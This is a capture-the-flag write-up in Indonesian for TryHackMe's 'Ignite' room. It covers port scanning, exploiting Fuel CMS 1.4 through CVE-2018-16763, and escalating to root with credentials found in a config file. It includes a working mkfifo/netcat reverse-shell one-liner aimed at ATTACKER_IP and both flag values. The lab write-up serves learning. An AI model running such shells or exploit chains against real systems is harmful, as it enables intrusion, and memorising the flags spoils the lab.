# Ignite — TryHackMe Writeup

**Target:** Ignite  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Kategori:** Web Enumeration, Fuel CMS, CVE-2018-16763, Command Execution, Credential Discovery

---

## Recon

Dimulai dengan Rustscan untuk melakukan port scanning.

```bash
rustscan -b 500 --scripts none -t 5000 -a TARGET_IP
```

Dilanjutkan dengan Nmap untuk melakukan enumerasi service.

```bash
nmap -sC -sV -T4 -p80 TARGET_IP
```

![port](images/port.png)

Dari hasil Nmap, diketahui bahwa website menggunakan **Fuel CMS** dan `robots.txt` berisi path:

```text
/fuel/
```

Berdasarkan informasi tersebut, saya mencoba mengecek website dan menemukan bahwa homepage masih menampilkan default Fuel CMS dengan versi **1.4**.

![homepage](images/homepage.png)

---

## Initial Foothold — Fuel CMS

Saya kemudian mencari informasi mengenai versi Fuel CMS tersebut dan menemukan **CVE-2018-16763**.

Kerentanan tersebut terjadi pada endpoint:

```text
/fuel/pages/select/
```

dengan parameter `filter`.

Dengan informasi tersebut, saya mencari exploit yang tersedia menggunakan SearchSploit dan menemukan exploit yang sesuai.

![search](images/search.png)

Exploit tersebut berhasil memberikan interactive shell pada target.

Namun, shell dari exploit tersebut bersifat stateless sehingga saya tidak dapat berpindah directory dengan nyaman. Saya kemudian mencoba menggunakan metode reverse shell berbasis `/dev/tcp` maupun `/dev/udp`, tetapi pada target tidak tersedia interface `/dev/tcp` maupun `/dev/udp`.

Karena itu, saya menggunakan alternatif berbasis named pipe (`mkfifo`) dengan Netcat.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP 9004 >/tmp/f
```

![shell](images/shell.png)

Setelah reverse shell berhasil didapatkan, saya dapat melakukan enumerasi secara lebih leluasa.

---

## Credential Discovery

Dari hasil enumerasi, saya menemukan credential user `root` di:

```text
/var/www/html/fuel/application/config/database.php
```

Credential tersebut ternyata valid dan dapat digunakan untuk berpindah ke user `root`.

![root](images/root.png)

---

## Flags

### Flag

```text
6470e394cbf6dab6a91682cc8585059b
```

### Root Flag

```text
b9bbcb33e11b80be759c4e844862482d
```
